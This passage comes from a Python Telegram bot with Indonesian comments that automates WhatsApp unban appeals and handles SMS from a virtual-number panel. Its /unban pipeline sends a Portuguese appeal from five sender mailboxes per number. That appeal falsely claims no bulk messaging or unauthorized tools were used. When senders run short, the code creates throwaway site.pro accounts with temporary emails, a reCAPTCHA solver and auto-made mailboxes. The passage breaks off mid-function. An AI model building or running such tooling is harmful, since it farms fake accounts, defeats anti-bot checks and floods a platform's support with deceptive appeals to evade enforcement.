        # Fallback: cari di DB allowed_users
        if not target_id:
            try:
                cur.execute(
                    "SELECT user_id, username FROM allowed_users WHERE username = ? COLLATE NOCASE",
                    (username,),
                )
                r = cur.fetchone()
                if r:
                    target_id = r[0]
                    target_username = r[1] or username
            except:
                pass
        
        if not target_id:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Username <code>{target_input}</code> tidak ditemukan.\n"
                f"User belum pernah /start ke bot.\n\n━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            return
    else:
        try:
            target_id = int(target_input)
        except ValueError:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\nGunakan User ID (angka) atau @username.",
                parse_mode=ParseMode.HTML
            )
            return
        
    if target_id == USER_ID:
        await update.message.reply_text(f"{em(E2, '⭐')} <b>Tidak bisa memblokir Owner!</b>", parse_mode=ParseMode.HTML)
        return
        
    try:
        cur.execute("DELETE FROM allowed_users WHERE user_id = ?", (target_id,))
        cur.execute("DELETE FROM admins WHERE user_id = ?", (target_id,))
        conn.commit()
        
        logout_user(target_id)
        
        if target_id in active_notif_monitor:
            active_notif_monitor.remove(target_id)
            if target_id in notif_start_time:
                notif_start_time.pop(target_id, None)
            notif_sms_count.pop(target_id, None)
            notif_seen_sms.pop(target_id, None)
        
        sms_aktif_users.discard(target_id)
        sms_aktif_seen.pop(target_id, None)
        sms_aktif_start_time.pop(target_id, None)
        sms_aktif_count.pop(target_id, None)
        
        uname_text = f" (@{target_username})" if target_username else ""
        await update.message.reply_text(
            f"{em(E2, '⛔')} <b>USER BANNED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{em(CE_PROFILE, '👤')} User: <code>{target_id}</code>{uname_text}\n"
            f"{em(E1, '✅')} Dihapus dari allowed_users\n"
            f"{em(E1, '✅')} Dihapus dari admins\n"
            f"{em(E1, '✅')} Session di-logout\n"
            f"{em(E1, '✅')} Monitoring dihentikan\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal memblokir user: {e}")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /unban — Dual purpose:
    1. /unban {nomor_wa} — Kirim WA unban request via 5 sender otomatis (OWNER ONLY)
    2. /unban {user_id/@username} — Lepas blokir user dari bot (owner/admin)
    """
    user_id = update.effective_user.id

    # ── Deteksi apakah input = nomor WA (phone number) ──
    raw = " ".join(context.args) if context.args else ""
    numbers = _parse_fix_numbers(raw) if raw else []

    # Kalau ada nomor WA terdeteksi → jalur WA UNBAN (owner only, 5 sender)
    if numbers:
        if not is_owner(user_id):
            await update.message.reply_text(
                _screen('UNBAN WHATSAPP',
                        f"{em(E2,'❌')} <b>Fitur ini hanya untuk owner.</b>"),
                parse_mode=ParseMode.HTML,
            )
            return

        # Tampilkan konfirmasi dulu dengan inline buttons
        num_list = "\n".join(
            f"  {em(CE_NOMOR,'📞')} <code>+{n}</code>" for n in numbers
        )
        text = _screen('UNBAN WHATSAPP', (
            f"{em(CE_WHATSAPP,'❤️')} <b>Unban WhatsApp — 5× Sender</b>\n\n"
            f"{em(E6,'🚀')} <b>Nomor yang akan diproses ({len(numbers)}):</b>\n"
            f"{num_list}\n\n"
            f"  {em(CE_WHATSAPP,'❤️')} Sender per nomor: <b>5</b>\n"
            f"  {em(CE_EMAIL,'📩')} Total email: <b>{len(numbers) * UNBAN_SENDERS_PER_NOMOR}</b>\n"
            f"  {em(CE_WAKTU,'⏲')} Estimasi: <b>~{len(numbers) * 2} menit</b>\n\n"
            f"<i>Setiap nomor akan dikirim dari 5 sender berbeda ke WhatsApp support.</i>"
        ))

        # Simpan data nomor untuk callback
        unban_data_key = f"unban_numbers_{user_id}"
        context.user_data[unban_data_key] = numbers

        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "KIRIM SEKARANG",
                    callback_data=f"unban_send_{user_id}",
                    icon_custom_emoji_id=E1,
                    style="primary",
                ),
            ],
            [
                InlineKeyboardButton(
                    "BATAL",
                    callback_data=f"unban_cancel_{user_id}",
                    icon_custom_emoji_id=E2,
                    style="danger",
                ),
            ],
        ])
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
        return

    # ── Jalur lama: unban user dari bot (owner/admin) ──
    if not (is_owner(user_id) or is_admin(user_id)):
        return

    if not context.args:
        await update.message.reply_text(
            f"{em(E1, '✅')} <b>UNBAN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>WA Unban (Owner only):</b>\n"
            f"  <code>/unban 6285757411154</code>\n"
            f"  <code>/unban 628xxx, 628yyy</code>\n"
            f"  → Kirim 5 sender otomatis ke WA support\n\n"
            f"<b>User Unban (Admin/Owner):</b>\n"
            f"  <code>/unban @username</code>\n"
            f"  <code>/unban 123456789</code> (Telegram ID)\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
        return

    target_input = context.args[0].strip()
    target_id = None
    target_username = None

    if target_input.startswith('@'):
        target_id, target_username, err = await resolve_username_to_id_async(target_input, context)
        if not target_id:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{err}\n\n━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            return
    else:
        try:
            target_id = int(target_input)
        except ValueError:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\nGunakan User ID (angka) atau @username.",
                parse_mode=ParseMode.HTML
            )
            return

    try:
        uname_db = target_username or f"User_{target_id}"
        cur.execute("INSERT OR IGNORE INTO allowed_users (user_id, username, added_by) VALUES (?, ?, ?)", (target_id, uname_db, user_id))
        conn.commit()
        uname_text = f" (@{target_username})" if target_username else ""
        await update.message.reply_text(
            f"{em(E1, '⭐')} <b>USER UNBANNED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{em(CE_PROFILE, '👤')} User: <code>{target_id}</code>{uname_text}\n"
            f"{em(E1, '✅')} Akses bot telah dipulihkan\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal unban user: {e}")


# ════════════════════════════════════════════════════════════════
#  /unban WA — Background Worker (5 sender per nomor, owner only)
# ════════════════════════════════════════════════════════════════

# Template pesan unban WA (Portugis)
WA_UNBAN_MESSAGE_TEMPLATE = (
    "Olá, Equipe de Suporte do WhatsApp,\n\n"
    "Estou entrando em contato para solicitar uma revisão da suspensão da minha conta do WhatsApp.\n\n"
    "Recentemente, minha conta foi bloqueada de forma repentina e inesperada. Pelo que pude observar, "
    "diversas contas também foram afetadas no mesmo período, o que me leva a acreditar que minha conta "
    "possa ter sido incluída em um bloqueio em massa por engano.\n\n"
    "Gostaria de esclarecer que utilizo o WhatsApp apenas para comunicação pessoal e atividades legítimas. "
    "Não enviei mensagens em massa, não pratiquei spam, não utilizei ferramentas não autorizadas, versões "
    "modificadas do aplicativo ou qualquer atividade que viole os Termos de Serviço do WhatsApp.\n\n"
    "A suspensão ocorreu sem qualquer comportamento irregular de minha parte, e por esse motivo acredito que "
    "possa ter havido um erro na análise automatizada da conta. Entendo a importância das políticas de "
    "segurança da plataforma e respeito totalmente as regras estabelecidas pelo WhatsApp.\n\n"
    "Essa conta possui grande importância para mim, pois é utilizada para comunicação com familiares, "
    "amigos, estudos e assuntos profissionais. A perda de acesso está causando dificuldades significativas "
    "em minha rotina diária.\n\n"
    "Por gentileza, solicito uma revisão manual do caso e uma nova análise da suspensão aplicada à minha conta. "
    "Caso sejam necessárias informações adicionais para a verificação, estarei à disposição para "
    "fornecê-las imediatamente.\n\n"
    "Número de telefone:\n"
    "+{nomor}\n\n"
    "Agradeço antecipadamente pela atenção, compreensão e pelo tempo dedicado à análise desta solicitação. "
    "Espero que minha conta possa ser restaurada após uma revisão cuidadosa.\n\n"
    "Atenciosamente,\n\n"
    "DikZz"
)

# Jumlah sender per nomor untuk /unban
UNBAN_SENDERS_PER_NOMOR = 5


async def _process_unban_background(numbers, user_id, message, context):
    """Background worker /unban WA: 5 sender per nomor, owner only.

    Berbeda dengan /fix (1 sender per nomor), /unban mengirim dari 5 sender
    yang BERBEDA untuk SETIAP nomor. Jadi kalau 1 nomor = 5 email terkirim.
    """
    total_nomor = len(numbers)
    total_sends_needed = total_nomor * UNBAN_SENDERS_PER_NOMOR
    main_loop = asyncio.get_running_loop()

    can_start, limit_msg = _sitepro_can_start(user_id)
    if not can_start:
        try:
            await message.edit_text(
                _screen('UNBAN WHATSAPP',
                        f"{em(E2,'❌')} {limit_msg}"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    # State untuk progress
    state = {
        'stage': 'starting',
        'sent_done': 0,
        'reply_done': 0,
        'current_nomor': '',
        'current_sender_idx': 0,
    }

    def _render(stage_label):
        sent = state['sent_done']
        rep = state['reply_done']
        body = (
            f"{em(CE_LOADING,'🟠')} <b>{stage_label}</b>\n\n"
            f"  {em(CE_NOMOR,'📞')} Nomor: <b>{total_nomor}</b>\n"
            f"  {em(CE_WHATSAPP,'❤️')} Sender/nomor: <b>{UNBAN_SENDERS_PER_NOMOR}</b>\n"
            f"  {em(E6,'🚀')} Terkirim: <b>{sent}/{total_sends_needed}</b>\n"
            f"  {em(E1,'✅')} Balasan: <b>{rep}</b>\n"
        )
        if state['current_nomor']:
            body += f"\n  📌 Aktif: <code>+{state['current_nomor']}</code> (sender {state['current_sender_idx']}/{UNBAN_SENDERS_PER_NOMOR})"
        return _screen('UNBAN WHATSAPP', body)

    async def _safe_edit(text):
        try:
            await message.edit_text(text, parse_mode=ParseMode.HTML)
        except Exception:
            pass

    def _progress_cb(stage, data):
        if stage == 'account_ready':
            state['stage'] = 'kirim'
        elif stage == 'sent':
            if data.get('ok'):
                state['sent_done'] += 1
            state['current_sender_idx'] = data.get('sender_idx', 0)
            state['current_nomor'] = data.get('nomor', '')
        elif stage == 'reply':
            state['reply_done'] += 1
        try:
            label = "Mengirim permintaan ke WhatsApp support..."
            if stage == 'reply':
                label = "Balasan diterima dari WhatsApp!"
            asyncio.run_coroutine_threadsafe(_safe_edit(_render(label)), main_loop)
        except Exception:
            pass

    # Initial status
    await _safe_edit(_render("Menyiapkan sender..."))

    try:
        import functools

        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            _SITEPRO_GLOBAL_POOL,
            functools.partial(
                _run_unban_pipeline,
                numbers,
                CAPTCHA_API_KEY,
                cur, conn,
                CAPTCHA_SOLVER,
                240,  # reply_wait
                _progress_cb,
            ),
        )

        # Build final report
        nomor_status = result.get('numbers', [])
        total_sent = result.get('total_sent', 0)
        total_reply = result.get('total_replied', 0)

        lines = []
        for ns in nomor_status:
            n = ns['nomor']
            sent_count = ns.get('sent_count', 0)
            if ns['replied']:
                icon = em(E1, '✅')
                tag = f"balasan diterima ({sent_count}/{UNBAN_SENDERS_PER_NOMOR} sender)"
            elif sent_count > 0:
                icon = em(CE_LOADING, '🟠')
                tag = f"terkirim {sent_count}/{UNBAN_SENDERS_PER_NOMOR} sender, belum ada balasan"
            else:
                icon = em(E2, '❌')
                tag = "gagal kirim"
            lines.append(f"  {icon} <code>+{n}</code> — {tag}")

        header = (
            f"{em(CE_WHATSAPP,'❤️')} <b>Hasil UNBAN WhatsApp</b>\n\n"
            f"  {em(CE_NOMOR,'📞')} Total nomor: <b>{total_nomor}</b>\n"
            f"  {em(CE_WHATSAPP,'❤️')} Sender/nomor: <b>{UNBAN_SENDERS_PER_NOMOR}</b>\n"
            f"  {em(E6,'🚀')} Total terkirim: <b>{total_sent}/{total_sends_needed}</b>\n"
            f"  {em(E1,'✅')} Mendapat balasan: <b>{total_reply}</b>\n"
        )

        body = header + "\n<b>Detail per nomor:</b>\n" + ("\n".join(lines) if lines else "  -")

        if result.get('error') and total_sent == 0:
            body += f"\n\n{em(E2,'❌')} <i>{result['error']}</i>"

        if total_reply > 0:
            title = 'UNBAN WHATSAPP — BALASAN DITERIMA'
        elif total_sent > 0:
            title = 'UNBAN WHATSAPP — TERKIRIM'
        else:
            title = 'UNBAN WHATSAPP — GAGAL'

        try:
            await message.edit_text(
                _screen(title, body),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    finally:
        _sitepro_release(user_id)


def _run_unban_pipeline(
    numbers,
    captcha_key="",
    db_cur=None,
    db_conn=None,
    solver_type="browser",
    reply_wait=240,
    progress_cb=None,
):
    """Pipeline /unban: 5 sender per nomor (berbeda dari /fix yang 1 sender per nomor).

    Untuk setiap nomor, ambil 5 sender berbeda dan kirim email ke WA support.
    Lalu polling balasan dari semua sender yang berhasil kirim.
    """
    from sitepro_fix_module import (
        sitepro_restore_session, sitepro_open_webmail,
        roundcube_get_compose_token, roundcube_send_email,
        roundcube_read_inbox, _reserve_available_senders,
        _mark_sender_composed, emailqu_get_temp_email,
        sitepro_register_browser, sitepro_get_csrf,
        sitepro_create_website, sitepro_create_mailboxes,
        _save_account_with_mailboxes, MAX_MAILBOXES_PER_ACCOUNT,
        _sitepro_session, _random_name, _random_password,
    )

    out = {
        'success': False,
        'numbers': [],
        'total_sent': 0,
        'total_replied': 0,
        'error': None,
    }

    def _cb(stage, data):
        if progress_cb:
            try:
                progress_cb(stage, data)
            except Exception:
                pass

    def _norm(n):
        c = str(n).strip().replace("+", "").replace("-", "").replace(" ", "")
        if not c.startswith("62") and c.startswith("0"):
            c = "62" + c[1:]
        return c

    numbers = [_norm(n) for n in numbers]

    def _wa_message(nomor_clean):
        return WA_UNBAN_MESSAGE_TEMPLATE.replace("{nomor}", nomor_clean)

    # Session cache
    session_cache = {}

    def _session_for(sender):
        aid = sender['account_id']
        if aid in session_cache:
            return session_cache[aid]
        sess, ok = sitepro_restore_session(
            sender.get('phpsessid'),
            email=sender.get('sitepro_email') or sender.get('temp_email'),
            password=sender.get('sitepro_password'),
        )
        if ok and sess:
            session_cache[aid] = sess
            return sess
        return None

    # Register akun baru kalau sender habis
    def _register_new_account():
        temp_email, _d = emailqu_get_temp_email()
        if not temp_email:
            return None, "Gagal buat alamat sementara"
        name = _random_name()
        password = _random_password()

        if solver_type == "browser":
            ok, sess, msg = sitepro_register_browser(temp_email, name, password, headless=False, timeout=300)
            if not ok:
                return None, f"register: {msg}"
        else:
            sess = _sitepro_session()
            from sitepro_fix_module import solve_recaptcha
            csrf, sess = sitepro_get_csrf(sess)
            if not csrf:
                return None, "Gagal ambil CSRF"
            captcha_token = solve_recaptcha(
                captcha_key, "6LeKkToUAAAAAHd9EiB6BaSXazFQ5CFIxmyLFm1Z",
                "https://site.pro/id/", solver_type=solver_type,
            )
            if not captcha_token:
                return None, "Gagal solve captcha"
            from sitepro_fix_module import sitepro_register, sitepro_confirm_code, emailqu_poll_inbox, emailqu_extract_otp
            ok, sess, msg = sitepro_register(sess, temp_email, name, password, csrf, captcha_token)
            if not ok:
                return None, f"register: {msg}"
            body = emailqu_poll_inbox(temp_email, timeout=90, interval=3)
            otp = emailqu_extract_otp(body) if body else None
            if not otp:
                return None, "Timeout/Gagal OTP"
            ok, sess, msg = sitepro_confirm_code(sess, otp)
            if not ok:
                return None, f"konfirmasi: {msg}"

        csrf, _ = sitepro_get_csrf(sess)
        ws_id, _domain, msg = sitepro_create_website(sess, csrf)
        if not ws_id:
            return None, f"siapkan akun: {msg}"

        mboxes = sitepro_create_mailboxes(sess, csrf, password, count=MAX_MAILBOXES_PER_ACCOUNT)
        if not mboxes:
            return None, "Gagal buat mailbox"

        phpsessid = sess.cookies.get('PHPSESSID', '')
        acct_id = _save_account_with_mailboxes(
            db_cur, db_conn,
            {
                'user_id': 0, 'temp_email': temp_email,
                'sitepro_email': mboxes[0]['email'],
                'sitepro_password': password,
                'phpsessid': phpsessid, 'csrf_token': csrf or '',
                'website_id': ws_id,
            },
            mboxes,
        )
        if acct_id:
            session_cache[acct_id] = sess

        new_senders = []
        if acct_id and db_cur:
            db_cur.execute(
                "SELECT id, mailbox_id, email FROM sitepro_mailboxes WHERE account_id = ? ORDER BY id ASC",
                (acct_id,),
            )
            for m in db_cur.fetchall():
                new_senders.append({
                    'row_id': m[0], 'mailbox_id': m[1], 'email': m[2],
                    'account_id': acct_id, 'phpsessid': phpsessid,
                    'sitepro_email': mboxes[0]['email'], 'temp_email': temp_email,
                    'sitepro_password': password,
                })
        else:
            for m in mboxes:
                new_senders.append({
                    'row_id': None, 'mailbox_id': m['mailbox_id'], 'email': m['email'],
                    'account_id': acct_id, 'phpsessid': phpsessid,
                    'sitepro_email': mboxes[0]['email'], 'temp_email': temp_email,
                    'sitepro_password': password,
                })
        if not new_senders:
            return None, "Akun dibuat tapi tidak ada sender tersimpan"
        return new_senders, None

    # ── MAIN: 5 sender per nomor ──────────────────────────────────────
    # Ambil total sender yang dibutuhkan: nomor x 5
    total_senders_needed = len(numbers) * UNBAN_SENDERS_PER_NOMOR
    sender_queue = _reserve_available_senders(
        db_cur, db_conn, limit=total_senders_needed, server=None
    ) if (db_cur and db_conn) else []

    if sender_queue:
        print(f"[UNBAN] Pakai {len(sender_queue)} sender dari pool")

    _cb('account_ready', {'reused': len(sender_queue) > 0})

    nums_status = []
    used_sends = []  # track semua sends untuk polling balasan

    for nomor in numbers:
        ns = {'nomor': nomor, 'sent_count': 0, 'sent': False, 'replied': False}

        for sender_idx in range(1, UNBAN_SENDERS_PER_NOMOR + 1):
            # Ambil 1 sender
            sender = None
            while sender is None:
                if sender_queue:
                    sender = sender_queue.pop(0)
                else:
                    new_senders, err = _register_new_account()
                    if not new_senders:
                        if ns['sent_count'] == 0 and not nums_status:
                            out['error'] = err
                        break
                    sender_queue.extend(new_senders)

            if sender is None:
                break

            sess = _session_for(sender)
            if not sess:
                continue

            ws_session, msg = sitepro_open_webmail(sess, sender['mailbox_id'])
            if not ws_session:
                continue

            token, from_id, compose_id = roundcube_get_compose_token(ws_session)
            if not token:
                continue

            ok, smsg = roundcube_send_email(
                ws_session, token, from_id, compose_id,
                "support@support.whatsapp.com", _wa_message(nomor),
            )
            if ok:
                ns['sent_count'] += 1
                ns['sent'] = True
                out['total_sent'] += 1
                _mark_sender_composed(db_cur, db_conn, sender.get('row_id'), used_for=nomor)
                used_sends.append({
                    'nomor': nomor, 'mailbox_id': sender['mailbox_id'],
                    'row_id': sender.get('row_id'), 'ws_session': ws_session,
                    'account_id': sender['account_id'],
                })

            _cb('sent', {'nomor': nomor, 'ok': ok, 'sender_idx': sender_idx})
            time.sleep(1)

        nums_status.append(ns)

    out['numbers'] = nums_status

    # ── Polling balasan ──────────────────────────────────────────────
    pre_uid = {}
    for us in used_sends:
        try:
            pre_msgs, _e = roundcube_read_inbox(us['ws_session'], timeout=15, fetch_body=False)
            pre_uid[us['mailbox_id']] = max((int(m.get('uid', 0)) for m in pre_msgs), default=0)
        except Exception:
            pre_uid[us['mailbox_id']] = 0

    deadline = time.time() + reply_wait
    replies_seen = set()
    matched_nomors = set()

    while used_sends and time.time() < deadline:
        for us in used_sends:
            if us['nomor'] in matched_nomors:
                continue
            msgs, _err = roundcube_read_inbox(us['ws_session'], timeout=15)
            if not msgs:
                continue
            base = pre_uid.get(us['mailbox_id'], 0)
            msgs_sorted = sorted(msgs, key=lambda x: int(x.get('uid', 0)))
            for m in msgs_sorted:
                try:
                    uid_int = int(m.get('uid', 0))
                except Exception:
                    continue
                if uid_int <= base:
                    continue
                key = f"{us['mailbox_id']}:{uid_int}"
                if key in replies_seen:
                    continue
                subj = (m.get('subject') or '').lower()
                body_text = (m.get('body') or '').lower()
                frm = (m.get('from') or '').lower()
                if ('whatsapp' not in subj and 'whatsapp' not in body_text
                        and 'whatsapp' not in frm):
                    continue
                replies_seen.add(key)
                for ns_item in nums_status:
                    if ns_item['nomor'] == us['nomor'] and not ns_item['replied']:
                        ns_item['replied'] = True
                        break
                _cb('reply', {'nomor': us['nomor']})
                matched_nomors.add(us['nomor'])
                break

        if len(matched_nomors) >= len(numbers):
            break
        time.sleep(5)

    out['total_replied'] = sum(1 for ns in nums_status if ns['replied'])
    out['success'] = out['total_sent'] > 0
    return out


async def live_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /live [filter] - Lihat SMS terbaru dengan filter"""
    if not is_allowed_user(update.effective_user.id):
        return
    try:
        user_id = update.effective_user.id
        
        
        if not check_user_login(user_id):
            await update.message.reply_text(
                f"{em(E2,'⭐')} Kamu belum login! Gunakan /cookies dulu.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        
        search_term = ""
        if context.args:
            search_term = " ".join(context.args).lower()
        
        filter_display = f"{em(E2,'⭐')} Filter: {search_term}" if search_term else f"{em(E2,'⭐')} Semua negara"
        
        msg = await update.message.reply_text(
            f"{em(CE_LOADING,'🟠')} <i>Mengambil SMS terbaru...</i>\n{filter_display}",
            parse_mode=ParseMode.HTML
        )
        
        
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        
        if not logged_in or not cookies_dict or not csrf:
            await msg.edit_text(
                f"{em(E2,'⭐')} Session expired! Silahkan login ulang dengan /cookies",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        session = requests.Session()
        for key, value in cookies_dict.items():
            session.cookies.set(key, value)
        
        
        data = await bg.run(user_id, fetch_live_sms, session, csrf, search_term, 15)
        
        if not data or 'data' not in data:
            await msg.edit_text(
                f"{em(E2,'⭐')} Gagal mengambil data!",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        items = data.get('data', [])
        total = data.get('recordsFiltered', 0)
        
        if not items:
            await msg.edit_text(
                f"{_header('LIVE SMS · 10 TERBARU')}\n\n"
                f"  {em(E2,'⭐')} Total SMS: {total}\n"
                f"  {em(E1,'⭐')} Coba lagi nanti\n\n"
                f"{_footer()}",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("REFRESH", callback_data=f"live_sms_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
                    InlineKeyboardButton("MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
            return
        
        
        now_makassar = (datetime.now() + timedelta(hours=8)).strftime('%d/%m/%Y %H:%M')
        
        filter_label = f"Filter: {search_term}" if search_term else "Semua negara"

        header_txt = _header('LIVE SMS · 10 TERBARU')
        footer_txt = _footer()
        text = (
            f"{header_txt}\n\n"
            f"  {em(CE_WAKTU,'⏲')} <b>Waktu</b>  <code>{now_makassar} WITA</code>\n"
            f"  {em(E2,'⭐')} <b>Filter</b>  <code>{filter_label}</code>\n"
            f"  {em(E1,'⭐')} <b>Total</b>  <code>{total} SMS</code>\n"
            f"  {'─'*30}\n\n"
        )
        
        keyboard = []
        
        for i, item in enumerate(items[:10], 1):
            range_name = item.get('range', 'Unknown')
            termination = item.get('termination', {})
            test_number_html = termination.get('test_number', '')
            number = extract_number_from_html(test_number_html)
            termination_id = termination.get('id')
            sent_time = item.get('senttime', '')

            makassar_time = '–'
            try:
                if sent_time:
                    for fmt in ['%Y-%m-%d %H:%M:%S', '%d/%m/%Y %H:%M:%S', '%Y/%m/%d %H:%M:%S']:
                        try:
                            dt = datetime.strptime(sent_time, fmt)
                            makassar_time = (dt + timedelta(hours=8)).strftime('%H:%M:%S')
                            break
                        except:
                            continue
            except:
                makassar_time = sent_time or '–'

            num_display = f"<code>+{number}</code>" if number else "<i>–</i>"
            range_display = f"<code>{range_name}</code>"
            text += (
                f"  {em(E2,'⭐')} <b>{i:02d}.</b> {range_display}\n"
                f"      └ 📱 {num_display} │ 🕒 <code>{makassar_time}</code>\n\n"
            )
            
            display = (range_name[:15] + '…') if len(range_name) > 15 else range_name
            number_suffix = number[-6:] if number and len(number) >= 6 else (number or '???')
            
            if number and len(number) > 5:
                search_prefix = number[:-5]
            else:
                search_prefix = number or ''
                
            
            filter_country = range_name.split()[0] if ' ' in range_name else range_name
            filter_country = filter_country.replace('_', '')

            # Cache mapping termination_id -> range_name agar handler 'lm_' instan
            term_id_map = context.user_data.get(f'term_id_map_{user_id}', {})
            term_id_map[str(termination_id)] = range_name
            context.user_data[f'term_id_map_{user_id}'] = term_id_map

            emoji_id = get_flag_custom_emoji_id(range_name)
            keyboard.append([
                InlineKeyboardButton(
                    f"{display} · {number_suffix}", 
                    callback_data=f"lm_{termination_id}_{filter_country}_{search_prefix}_{user_id}",
                    icon_custom_emoji_id=emoji_id,
                    style="success"
                )
            ])
            
        
        
        keyboard.append([
            InlineKeyboardButton("SEMUA", callback_data=f"live_filter__{user_id}", icon_custom_emoji_id=get_flag_custom_emoji_id("DEFAULT"), style="primary"),
            InlineKeyboardButton("PERU", callback_data=f"live_filter_peru_{user_id}", icon_custom_emoji_id=get_flag_custom_emoji_id("PERU"), style="primary"),
            InlineKeyboardButton("GERMAN", callback_data=f"live_filter_german_{user_id}", icon_custom_emoji_id=get_flag_custom_emoji_id("GERMAN"), style="primary")
        ])
        
        keyboard.append([
            InlineKeyboardButton("REFRESH", callback_data=f"live_sms_{user_id}", icon_custom_emoji_id="5870903672937911120", style="primary"),
            InlineKeyboardButton("MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ])

        text += footer_txt
        
        await msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        logger.error(f"Error live_command: {e}")
        await update.message.reply_text(
            f" Error: {str(e)[:100]}",
            reply_markup=get_back_keyboard(update.effective_user.id)
        )
        

async def process_add_background(msg, user_id, email, target, task_id, source="add"):
    """Background process untuk add nomor via WebSocket - UNTUK SEMUA SUMBER"""

    start_time = time.time()
    msg_ref = msg
    
    try:
        cur.execute("INSERT INTO active_tasks (task_id, user_id, cancel_flag) VALUES (?, ?, 0)", (task_id, user_id))
        conn.commit()
    except Exception as e:
        logger.error(f"Error saving task: {e}")

    # Initial Phase 1: Pre-Bulk Cleaning
    await msg_ref.edit_text(
        f"{em(E5,'🏴‍☠️')} <b>iVASMS · PROCESS ADD NUMBER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E1,'⭐')} <b>Range:</b> <code>{target}</code>\n"
        f"{em(E2,'⭐')} <b>Akun:</b> <code>{email}</code>\n\n"
        f"{em(CE_LOADING,'🟠')} <b>Status:</b>\n"
        f"├─ Pre-Bulk Cleaning: <code>[Running...] 🗑</code>\n"
        f"├─ Socket Connection: <code>[Pending]</code>\n"
        f"└─ Add Number Process: <code>[Pending]</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=get_progress_keyboard(task_id, user_id)
    )

    # Auto bulk: hapus nomor lama dulu sebelum add
    auto_bulk_before = False
    try:
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        if logged_in and cookies_dict and csrf:
            session = requests.Session()
            for key, value in cookies_dict.items():
                session.cookies.set(key, value)
            bulk_success, bulk_msg = await bg.run(user_id, bulk_return_numbers, session, csrf)
            if bulk_success:
                auto_bulk_before = True
                print(f"[AUTO-BULK] Berhasil hapus nomor lama untuk {email}")
                # Reset socket status setelah bulk
                socket_pool.reset_account_status(email)
            else:
                print(f"[AUTO-BULK] Gagal hapus nomor lama: {bulk_msg}")
    except Exception as e:
        print(f"[AUTO-BULK] Error: {e}")

    # Phase 2: Socket Connection & Handshake
    bulk_status_display = "Sukses ✅" if auto_bulk_before else "Dilewati ⚠️"
    await msg_ref.edit_text(
        f"{em(E5,'🏴‍☠️')} <b>iVASMS · PROCESS ADD NUMBER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E1,'⭐')} <b>Range:</b> <code>{target}</code>\n"
        f"{em(E2,'⭐')} <b>Akun:</b> <code>{email}</code>\n\n"
        f"{em(CE_LOADING,'🟠')} <b>Status:</b>\n"
        f"├─ Pre-Bulk Cleaning: <code>[{bulk_status_display}]</code>\n"
        f"├─ Socket Connection: <code>[Running...] 🔌</code>\n"
        f"└─ Add Number Process: <code>[Pending]</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=get_progress_keyboard(task_id, user_id)
    )

    result = await bg.run(user_id, websocket_add_number, email, target, user_id)
    
    total_time = int(time.time() - start_time)
    
    try:
        cur.execute("DELETE FROM active_tasks WHERE task_id = ?", (task_id,))
        conn.commit()
    except Exception as e:
        logger.error(f"Error deleting task: {e}")

    bulk_info = ""
    if result.get('auto_bulk_done') or auto_bulk_before:
        bulk_info = f"\n🔄 <b>Auto Bulk:</b> Nomor lama dihapus"
    
    method_display = result.get('method', 'unknown').upper()
    method_icon = "🔌" if 'socket' in result.get('method', '').lower() else "🌐"
    
    if result.get('success', 0) > 0:
        text = (
            f"{em(E5,'🏴‍☠️')} <b>iVASMS · PROCESS SUCCESS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(CE_PROFILE,'👤')} <b>User:</b> <code>{user_id}</code>\n"
            f"{em(CE_EMAIL,'📩')} <b>Akun:</b> <code>{email}</code>\n"
            f"{em(E1,'⭐')} <b>Range:</b> <code>{target}</code>\n\n"
